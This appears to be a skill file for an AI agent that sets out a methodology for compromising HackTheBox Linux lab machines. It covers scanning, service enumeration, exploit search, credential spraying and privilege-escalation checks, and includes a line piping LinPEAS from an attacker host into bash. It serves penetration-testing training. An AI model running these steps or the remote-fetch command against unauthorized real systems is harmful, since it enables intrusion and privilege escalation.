# SKILL: HackTheBox Linux Machine

## Description
Systematic methodology for Linux-based HackTheBox machines.

## Trigger Phrases
linux, nmap, linpeas, privesc, suid, cron, ssh, htb

## Methodology

### Phase 1: Reconnaissance
1. Speed Port Scan: `rustscan -a <IP> --ulimit 5000 -- -sCV -oN services.txt`
2. Quick UDP Scan: `nmap -sU --top-ports 20 <IP>`
3. Note OS hints from TTL, service banners

### Phase 2: Enumeration
1. **Web (80/443)**: `feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
2. **SMB (445)**: `smbclient -L //<IP>`, `enum4linux -a <IP>`, check null session
3. **FTP (21)**: anonymous login, check for writable dirs
4. **DNS (53)**: zone transfer `dig axfr @<IP> <domain>`
5. **SSH (22)**: banner grab, check for key-based auth

### Phase 3: Exploitation
1. Search for CVEs in identified versions: `searchsploit <service> <version>`
2. Check exploit-db, GitHub PoCs
3. If web app: test for SQLi, LFI/RFI, SSTI, file upload, auth bypass
4. If credentials found: spray across all services
5. If stuck: re-enumerate, check for hidden vhosts/subdomains

### Phase 4: Privilege Escalation
1. Run LinPEAS: `curl http://<attacker>/linpeas.sh | bash`
2. Check SUID binaries: `find / -perm -4000 2>/dev/null` → GTFOBins
3. Check cron jobs: `cat /etc/crontab`, `ls -la /etc/cron.*`
4. Check sudo: `sudo -l`
5. Check writable paths in PATH, writable scripts called by root
6. Check kernel version: `uname -r` → kernel exploits
7. Check capabilities: `getcap -r / 2>/dev/null`
8. Check internal services: `ss -tlnp`, pivot if needed

### Phase 5: Post-Exploitation
1. Grab flags: `cat /home/*/user.txt`, `cat /root/root.txt`
2. Document the full attack chain for writeup
3. Save credentials and CVEs to memory
